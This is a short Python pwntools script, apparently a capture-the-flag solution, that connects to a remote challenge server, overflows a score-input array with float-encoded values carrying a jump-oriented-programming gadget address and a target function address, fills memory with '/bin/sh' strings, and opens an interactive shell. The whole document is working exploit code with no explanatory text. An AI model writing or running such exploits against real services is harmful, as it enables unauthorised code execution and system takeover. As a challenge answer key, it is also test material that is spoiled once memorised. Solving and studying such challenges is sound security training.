#!/usr/bin/env python3
# 傳自我的馬克布克

from pwn import *

context.log_level = "info"
context.arch = "amd64"

io = remote("202.38.93.141", 31341)

JOP_gadget = 0x4011DD
GET_my_hwatch_addr = 0x401201

io.recvline()
io.sendline(input("Input your token: ").encode())


def i64tof64(int_value):
    bytes_value = struct.pack("<Q", int_value)
    double_value = struct.unpack("<d", bytes_value)[0]
    return double_value


def f64toi64(double_value):
    bytes_value = struct.pack("<d", double_value)
    int_value = struct.unpack("<Q", bytes_value)[0]
    return int_value


io.recvuntil(":\n".encode())
io.sendline(str(0x100).encode())

stu_list = [4.3 for i in range(0x100)]
stu_list[0x10] = i64tof64(JOP_gadget)

io.recvuntil(":\n".encode())
for i in stu_list:
    io.sendline(str(i).encode())

io.recvuntil(b"...\n")
io.sendline(str(i64tof64(GET_my_hwatch_addr)).encode())
for _ in range(0x100 - 1):
    io.sendline(str(i64tof64(u64(b"/bin/sh\x00"))).encode())

io.interactive()
